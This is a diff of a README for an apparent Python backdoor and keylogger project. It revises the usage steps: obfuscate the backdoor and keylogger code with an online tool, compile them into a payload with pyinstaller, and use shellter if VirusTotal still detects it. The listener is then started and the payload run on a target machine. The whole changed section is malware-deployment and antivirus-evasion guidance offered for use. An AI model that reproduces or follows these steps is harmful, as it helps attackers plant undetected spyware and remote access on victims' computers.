@@ -24,9 +24,10 @@ Features:
 
 ```
 1. edit the host and the port for the listener.py and the backdoor.py
-2. and then "compile" the backdoor.py and the keylogger.py using pyinstaller to create a payload
-3. if virustotal still detects it, then use shellter to obfuscate it 
-4. start the listener.py on your target machine and execute the payload on your target machine
+2. go to https://pyobfuscate.com/ and obfuscate the code for the backdoor.py and the keylogger.py
+3. and then "compile" the backdoor.py and the keylogger.py using pyinstaller to create a payload
+4.. if virustotal still detects it, then use shellter to further obfuscate it
+5. start the listener.py on your target machine and execute the payload on your target machine
 ```
 Proof:
 ![image](https://user-images.githubusercontent.com/93959737/206237397-bc30953a-4062-448f-9664-4bf230d1a2e9.png)
